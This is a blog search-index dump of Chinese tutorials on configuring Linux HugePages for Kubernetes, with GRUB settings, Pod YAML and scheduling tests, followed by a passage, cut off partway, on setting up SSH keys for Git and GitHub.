[{"categories":["K8S"],"content":"本文介绍了如何配置大页和k8s使用大页 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:0:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"1 关于大页Huge Pages 在 Linux 中大页分为两种： Huge pages ( 标准大页 ) 和 Transparent Huge pages( 透明大页 ) 。 内存是以块即页的方式进行管理的，当前大部分系统默认的页大小为 4096 bytes 即 4K。1MB 内存等于 256 页； 1GB 内存等于 256000 页。 CPU 拥有内置的内存管理单元，包含这些页面的列表，每个页面通过页表条目引用。当内存越来越大的时候， CPU 需要管理这些内存页的成本也就越高，这样会对操作系统的性能产生影响。 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:1:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"2 Huge Pages Huge pages 是从 Linux Kernel 2.6 后被引入的，目的是通过使用大页内存来取代传统的 4kb 内存页面， 以适应越来越大的系统内存，让操作系统可以支持现代硬件架构的大页面容量功能。 Huge pages 有两种格式大小：2MB 和1GB ，2MB 页块大小适合用于 GB 大小的内存， 1GB 页块大小适合用于 TB 级别的内存； 2MB 是默认的页大小。 Transparent Huge Pages 从RHEL 6 .SUSE Server 11,Oracle Linux(UEK2) 开始引入的一个功能。 而这两种大页, 根本的区别：Huge Page 是预分配的，Transparent Huge Pages 是动态分配的。 在两者一起使用的情况下，可能会导致性能问题和系统重启。Oracle 服务器建议禁用Transparent Huge Pages. 而在Oracle Linux 6.5 中，已经删除Transparent HugePages. Oracle 官方虽然推荐我们使用 Huge pages ，但是却建议我们关闭 Transparent Huge pages ，因为透明大页存在一些问题： 在 RAC 环境下 透明大页（ TransparentHugePages ）会导致异常节点重启，和性能问题； 在单机环境中，透明大页（ TransparentHugePages ） 也会导致一些异常的性能问题； 注：Transparent Huge Pages在32位的RHEL 6中是不支持的。 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:2:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"3 查看Huge Pages 查询标准大页的大小 之前说过，huge page 的大小是提前设置好的。那么设置的大页大小是多少呢。可以通过/proc/meminfo来看。 grep Huge /proc/meminfo AnonHugePages: 18432 kB HugePages_Total: 0 HugePages_Free: 0 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB AnonHugePages: 匿名 HugePages 数量。Oracle Linux 6.5 中已删除此计数器。与透明 HugePages 有关。 HugePages_Total: 分配的页面数目，和Hugepagesize相乘后得到所分配的内存大小 HugePages_Free: 从来没有被使用过的Hugepages数目。即使oracle sga已经分配了这部分内存，但是如果没有实际写入，那么看到的还是Free的。这是很容易误解的地方（池中尚未分配的 HugePages 数量。） HugePages_Rsvd: 已经被分配预留但是还没有使用的page数目。在Oracle刚刚启动时，大部分内存应该都是Reserved并且Free的，随着ORACLE SGA的使用，Reserved和Free都会不断的降低 HugePages_Surp: “surplus”的缩写形式，表示池中大于/proc/sys/vm/nr_hugepages 中值的 HugePages 数量。剩余 HugePages 的最大数量由 /proc/sys/vm/nr_overcommit_hugepages 控制。此值为0的情况很常见 Hugepagesize: 页面大小 HugePages_Free – HugePages_Rsvd 这部分是没有被使用到的内存，如果没有其他的oracle instance，这部分内存也许永远都不会被使用到，也就是被浪费了。 HugePages_Total-HugePages_Free+HugePages_Rsvd 就是目前实例需要的页面数量. 查看是否启用huge_page 可以通过两个文件中的参数来确定，系统是否启用了大页。 $ cat /proc/sys/vm/nr_hugepages 0 $ grep -i HugePages_Total /proc/meminfo HugePages_Total: 0 如果两个的结果都是0 ,说明系统中已禁用大页，而且不存在内存大页 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:3:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4 系统配置Huge Pages 开启该功能需要进行额外设置 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.1 备份文件 4.1.1 备份配置文件 cp /etc/default/grub /etc/default/grub.`date +%F`.bak 4.1.2 备份grub配置文件 cp /boot/grub2/grub.cfg /boot/grub2/grub.cfg.`date +%F`.bak # cp /boot/efi/EFI/centos/grub.cfg /boot/efi/EFI/centos/grub.cfg.`date +%F`.bak ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:1","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.2 编辑/etc/default/grub 文件 在 GRUB_CMDLINE_LINUX 那一行后面追加下面内容，例如： # vi /etc/default/grub GRUB_CMDLINE_LINUX=\"transparent_hugepage=never default_hugepagesz=2M hugepagesz=1G hugepages=1 hugepagesz=2M hugepages=512\" 说明：如果禁用透明大页，则需设置transparent_hugepage=never 各类型大页数量，可根据实际环境配置。 配置后节点文件实例，其中hugepages相关的内容是新增的，其它配置不改动 [root@host-136 home]# cat /etc/default/grub GRUB_TIMEOUT=5 GRUB_DISTRIBUTOR=\"$(sed 's, release .*$,,g' /etc/system-release)\" GRUB_DEFAULT=saved GRUB_DISABLE_SUBMENU=true GRUB_TERMINAL_OUTPUT=\"console\" GRUB_CMDLINE_LINUX=\"crashkernel=0M-4G:128M,4G-8G:256M,8G-:512M transparent_hugepage=never default_hugepagesz=2M hugepagesz=1G hugepages=1 hugepagesz=2M hugepages=512 nomodeset\" GRUB_DISABLE_RECOVERY=\"true\" GRUB_ENABLE_BLSCFG=true GRUB_DISABLE_OS_PROBER=true [root@host-136 home]# ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:2","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.3 重新生成grub配置文件 不同系统配置一下的grub配置文件 On BIOS-based machines, issue the following command as root: # grub2-mkconfig -o /boot/grub2/grub.cfg On UEFI-based machines, issue the following command as root: # grub2-mkconfig -o /boot/efi/EFI/redhat/grub.cfg ## centos # grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg ctyunos 系统 # grub2-mkconfig -o /boot/grub2/grub.cfg 再使用 grub2-mkconfig 生成grub.cfg配置文件。 # 注意不同系统下的配置文件路径 # grub2-mkconfig -o /boot/grub2/grub.cfg # grub2-mkconfig -o /boot/efi/EFI/centos/grub.cfg 配置实例： [root@claster4-master1 ~]# grub2-mkconfig -o /boot/grub2/grub.cfg Generating grub configuration file ... Found linux image: /boot/vmlinuz-5.10.0-136.12.0.86.ctl3.x86_64 Found initrd image: /boot/initramfs-5.10.0-136.12.0.86.ctl3.x86_64.img Found linux image: /boot/vmlinuz-0-rescue-60f6c5d40de24acabdcc67f51be8f5f8 Found initrd image: /boot/initramfs-0-rescue-60f6c5d40de24acabdcc67f51be8f5f8.img Adding boot menu entry for UEFI Firmware Settings ... done [root@claster4-master1 ~]# ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:3","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.4 重启节点 # reboot now init 6 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:4","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.5 检查大页配置信息 查看Hugepagesize、 HugePages_Total等参数 [root@host-136 ~]# grep Huge /proc/meminfo AnonHugePages: 0 kB ShmemHugePages: 0 kB FileHugePages: 0 kB HugePages_Total: 512 HugePages_Free: 512 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB Hugetlb: 2097152 kB [root@host-136 ~]# 检查大页数量配置，512个2M大页和1个1G大页 [root@host-136 ~]# cat /sys/kernel/mm/hugepages/hugepages-2048kB/nr_hugepages 512 [root@host-136 ~]# [root@host-136 ~]# [root@host-136 ~]# [root@host-136 ~]# cat /sys/kernel/mm/hugepages/hugepages-1048576kB/nr_hugepages 1 [root@host-136 ~]# ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:5","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"4.6 重启kubelet，让k8s生效大页内存资源 此时k8s尚未管理系统已生效的大页资源 需重启kubelet以生效 systemctl restart kubelet 查看配置大页内存的节点信息，能够看到2M和1G大页内存已在k8s集群节点中生效，如下 Capacity: chinatelecom/vcuda-core: 0 chinatelecom/vcuda-memory: 0 cpu: 112 ephemeral-storage: 51166812Ki hugepages-1Gi: 1Gi hugepages-2Mi: 1Gi memory: 395095064Ki pods: 110 tencent.com/vcuda-core: 0 tencent.com/vcuda-memory: 0 Allocatable: chinatelecom/vcuda-core: 0 chinatelecom/vcuda-memory: 0 cpu: 111600m ephemeral-storage: 51166812Ki hugepages-1Gi: 1Gi hugepages-2Mi: 1Gi memory: 381676706310 pods: 110 tencent.com/vcuda-core: 0 tencent.com/vcuda-memory: 0 注意以下信息变化： # k8s生效前 hugepages-1Gi: 0 hugepages-2Mi: 0 # k8s生效后 hugepages-1Gi: 1Gi hugepages-2Mi: 1Gi ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:4:6","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"5 K8S API 用户可以通过在容器级别的资源需求中使用资源名称 hugepages-\u003csize\u003e 来使用巨页，其中的 size 是特定节点上支持的以整数值表示的最小二进制单位。 例如，如果一个节点支持 2048KiB 和 1048576KiB 页面大小，它将公开可调度的资源 hugepages-2Mi 和 hugepages-1Gi。与 CPU 或内存不同，巨页不支持过量使用（overcommit）。 注意，在请求巨页资源时，还必须请求内存或 CPU 资源。 同一 Pod 的 spec 中可能会消耗不同尺寸的巨页。在这种情况下，它必须对所有挂载卷使用 medium: HugePages-\u003chugepagesize\u003e 标识。 apiVersion:v1kind:Podmetadata:name:huge-pages-examplespec:containers:- name:exampleimage:fedora:latestcommand:- sleep- infvolumeMounts:- mountPath:/hugepages-2Miname:hugepage-2mi- mountPath:/hugepages-1Giname:hugepage-1giresources:limits:hugepages-2Mi:100Mihugepages-1Gi:2Gimemory:100Mirequests:memory:100Mivolumes:- name:hugepage-2miemptyDir:# 必须为HugePages-xxx格式medium:HugePages-2Mi- name:hugepage-1giemptyDir:# 必须为HugePages-xxx格式medium:HugePages-1Gi Pod 只有在请求同一大小的巨页时才使用 medium：HugePages。 apiVersion:v1kind:Podmetadata:name:huge-pages-examplespec:containers:- name:exampleimage:fedora:latestcommand:- sleep- infvolumeMounts:- mountPath:/hugepagesname:hugepageresources:limits:hugepages-2Mi:100Mimemory:100Mirequests:memory:100Mivolumes:- name:hugepageemptyDir:# 可以为HugePages格式medium:HugePages 说明： 与CPU或内存不同，巨大页面不支持过度承诺。请注意，在请求hugepage资源时，必须同时请求内存或CPU资源。 巨页的资源请求值必须等于其限制值。该条件在指定了资源限制，而没有指定请求的情况下默认成立。 例如，在默认页面大小为 4KiB 的系统上，你可以指定限制 hugepages-2Mi: 80Mi。 如果容器尝试分配 40 个 2MiB 大小的巨页（总共 80 MiB ），则分配请求会失败。 说明： 不能过量使用 hugepages- * 资源。 这与 memory 和 cpu 资源不同。 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:5:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6 业务测试 使用大页内存的pod测试，k8s集群节点已有大页资源 ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.1 2M类型大页资源 apiVersion:v1kind:Podmetadata:name:huge-pages-2mi-examplespec:containers:- name:exampleimage:dockerhub.kubekey.local/kubesphereio/busybox:1.31.1command:- sleep- infvolumeMounts:- mountPath:/hugepagesname:hugepageresources:limits:hugepages-2Mi:10Mimemory:100Mirequests:memory:100Mivolumes:- name:hugepageemptyDir:# 可以为HugePages格式medium:HugePages ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:1","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.2 1G大页资源 apiVersion:v1kind:Podmetadata:name:huge-pages-1gi-examplespec:containers:- name:exampleimage:dockerhub.kubekey.local/kubesphereio/busybox:1.31.1command:- sleep- infvolumeMounts:- mountPath:/hugepagesname:hugepageresources:limits:hugepages-1Gi:1Gimemory:100Mirequests:memory:100Mivolumes:- name:hugepageemptyDir:# 可以为HugePages格式medium:HugePages ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:2","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.3 混合类型大页 apiVersion:v1kind:Podmetadata:name:huge-pages-examplespec:containers:- name:exampleimage:fedora:latestcommand:- sleep- infvolumeMounts:- mountPath:/hugepages-2Miname:hugepage-2mi- mountPath:/hugepages-1Giname:hugepage-1giresources:limits:hugepages-2Mi:100Mihugepages-1Gi:2Gimemory:100Mirequests:memory:100Mivolumes:- name:hugepage-2miemptyDir:medium:HugePages-2Mi- name:hugepage-1giemptyDir:medium:HugePages-1Gi 查看配置大页节点的大页内存使用情况，如下： Allocated resources: (Total limits may be over 100 percent, i.e., overcommitted.) Resource Requests Limits -------- -------- ------ cpu 1472m (1%) 4500m (4%) memory 1519Mi (0%) 3218Mi (0%) ephemeral-storage 0 (0%) 0 (0%) hugepages-1Gi 1Gi (100%) 1Gi (100%) hugepages-2Mi 210Mi (20%) 210Mi (20%) chinatelecom/vcuda-core 0 0 chinatelecom/vcuda-memory 0 0 tencent.com/vcuda-core 0 0 tencent.com/vcuda-memory 0 0 [root@cluster2-master1 ~]# kubectl get pod huge-pages-2mi-example 1/1 Running 0 102m huge-pages-mix-1gi-2mi-example 1/1 Running 0 34m ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:3","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.4 大页资源超用 pod作业已使用完1G大页内存，pod作业继续请求1G大页资源，测试如下： [root@cluster2-master1 hugepage]# kubectl get po |grep huge huge-pages-1gi-example 0/1 Pending 0 3m31s huge-pages-2mi-example 1/1 Running 0 106m huge-pages-mix-1gi-2mi-example 1/1 Running 0 38m [root@cluster2-master1 hugepage]# 查看排队等待pod信息，发现调度失败，原因为：节点的hugepages-1Gi资源都不满足作业pod请求 Events: Type Reason Age From Message ---- ------ ---- ---- ------- Warning FailedScheduling 40s (x4 over 4m3s) default-scheduler 0/7 nodes are available: 1 node(s) had taint {node-role.kubernetes.io/master: }, that the pod didn't tolerate, 6 Insufficient hugepages-1Gi. ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:4","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.5 大页资源使用+cpu 仅设置cpu，无memory，可以运行成功 apiVersion: v1 kind: Pod metadata: name: huge-pages-2mi-example spec: containers: - name: example image: dockerhub.kubekey.local/kubesphereio/busybox:1.31.1 command: - sleep - inf volumeMounts: - mountPath: /hugepages name: hugepage resources: limits: hugepages-2Mi: 10Mi #memory: 100Mi cpu: 1 requests: #memory: 100Mi cpu: 1 volumes: - name: hugepage emptyDir: # 可以为HugePages格式 medium: HugePages ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:5","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"6.6 大页资源使用错误 没有设置cpu和memory，接口报错，运行失败 apiVersion:v1kind:Podmetadata:name:huge-pages-2mi-examplespec:containers:- name:exampleimage:dockerhub.kubekey.local/kubesphereio/busybox:1.31.1command:- sleep- infvolumeMounts:- mountPath:/hugepagesname:hugepageresources:limits:hugepages-2Mi:10Mi# 错误：没有设置cpu和memory#memory: 100Mirequests:# 错误：没有设置cpu和memory#memory: 100Mivolumes:- name:hugepageemptyDir:# 可以为HugePages格式medium:HugePages 错误显示 [root@cluster2-master1 hugepage]# [root@cluster2-master1 hugepage]# kubectl create -f error-2m.yaml The Pod \"huge-pages-2mi-example\" is invalid: spec.containers[0].resources: Forbidden: HugePages require cpu or memory [root@cluster2-master1 hugepage]# [root@cluster2-master1 hugepage]# ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:6:6","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["K8S"],"content":"7 附录参考 Linux HugePage https://www.cnblogs.com/halberd-lee/p/12802918.html k8s管理巨页（HugePage） https://kubernetes.io/zh-cn/docs/tasks/manage-hugepages/scheduling-hugepages/ Linux 大页内存 Huge Pages 虚拟内存 https://www.cnblogs.com/studywithallofyou/p/17435497.html HugeTLB Pages https://www.kernel.org/doc/html/latest/admin-guide/mm/hugetlbpage.html 欧拉系统的内存大页配置 https://docs.openeuler.org/zh/docs/22.03_LTS_SP3/docs/StratoVirt/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE.html ","date":"2023-12-18","objectID":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/:7:0","tags":["K8S"],"title":"k8s管理大页HugePages配置说明","uri":"/posts/2023/12/k8s%E7%AE%A1%E7%90%86%E5%A4%A7%E9%A1%B5hugepages%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E/"},{"categories":["Git"],"content":"配置ssh方式连接git，每次配置都会忘记操作步骤，这里记录下。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:0:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"1 关于 ssh SSH 是较可靠，专为远程登录会话和其他网络服务提供安全性的协议。[2]使用 SSH 协议可以连接远程服务器和服务并向它们验证。连接远程仓库时无需输入密码而且能实现对 github 的流畅访问。除此之外我还用 ssh 协议成功在 Windows Terminal 中连接上了自己的远程服务器。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:1:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"2 检查现有的 ssh 密钥 Windows下检查： 桌面左下角windows徽标鼠标右键后展开应用和功能–\u003e点击进入后找到【可选功能】—\u003e查找【openssh】出现openssh客户端即表示自带的openssh可以使用； Windows 打开 GitBash，Linux 下打开终端，输入： $ ls -al ~/.ssh 如果你看到以下输出，那么说明你已经有 ssh 密钥（以 .pub 结尾的文件）： $ ls -al ~/.ssh | total 26 | drwxr-xr-x 1 197121 0 Mar 31 22:29 ./ | drwxr-xr-x 1 197121 0 Apr 16 23:36 ../ | -rw-r--r-- 1 197121 2610 Mar 31 22:27 id_rsa | -rw-r--r-- 1 197121 573 Mar 31 22:27 id_rsa.pub | -rw-r--r-- 1 197121 831 Apr 1 12:08 known_hosts | -rw-r--r-- 1 197121 92 Mar 31 22:26 known_hosts.old | 如果你不想用原来的密钥或者没有密钥的话也不用着急，看下一步如何生成新的 ssh 密钥。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:2:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"3 创建新的 ssh 密钥三部曲 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:3:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"3、1 生成新的 ssh 密钥 在 Windows 的 GitBash 或 Linux 终端输入： $ ssh-keygen -t rsa -b 4096 -C \"51482508@qq.com\" # 你可以把引号里的替换为你自己的邮箱，不换的话问题不大 然后终端会让你输入一些东西，可以不用输入直接一路回车，看到： SE@DESKTOP-8024PR5 MINGW64 ~/.ssh Generating public/private rsa key pair. Enter file in which to save the key (/c/Users/SE/.ssh/id_rsa): Enter passphrase (empty for no passphrase): Enter same passphrase again: Your identification has been saved in /c/Users/SE/.ssh/id_rsa Your public key has been saved in /c/Users/SE/.ssh/id_rsa.pub The key fingerprint is: SHA256:GLo38kvQhXjfnH1pTdjCQEwnzqr27nWPNOdG5SPfur4 51482508@qq.com The key's randomart image is: +---[RSA 4096]----+ | += . | | . . o.= o | | . + . o + o| | + = o + =.| | o o S = . +.o| | o . + .o| | o + o . *.+| | = o . . o Bo| | o. o+ .E=o| +----[SHA256]-----+ 代表密钥生成成功。 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:3:1","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"3、2 将SSH密钥添加到ssh-agent 3、2.1 确保 ssh 正在运行 终端输入： $ ssh-agent -s 看到如下输出： SSH_AUTH_SOCK=/tmp/ssh-WyTlOzJrybcW/agent.720; export SSH_AUTH_SOCK; SSH_AGENT_PID=721; export SSH_AGENT_PID; echo Agent pid 721; 代表 ssh 正常运行。 3.3.3 添加 ssh 到账户 执行以下两条命令： $ ssh-agent bash $ ssh-add ~/.ssh/id_rsa # 这里如果文件名被改过要写你自己定义的文件名 看到输出： dentity added: id_rsa (your_email@example.com) 添加成功！ ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:3:2","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"4 将密钥添加到 github 账户 ","date":"2023-10-12","objectID":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/:4:0","tags":["Git"],"title":"配置ssh方式连接git","uri":"/posts/2023/10/%E9%85%8D%E7%BD%AEssh%E6%96%B9%E5%BC%8F%E8%BF%9E%E6%8E%A5git/"},{"categories":["Git"],"content":"4、1 复制你的公钥 在终端使用： $ cat ~/.ssh/id_rsa.pub 看到： ssh-rsa 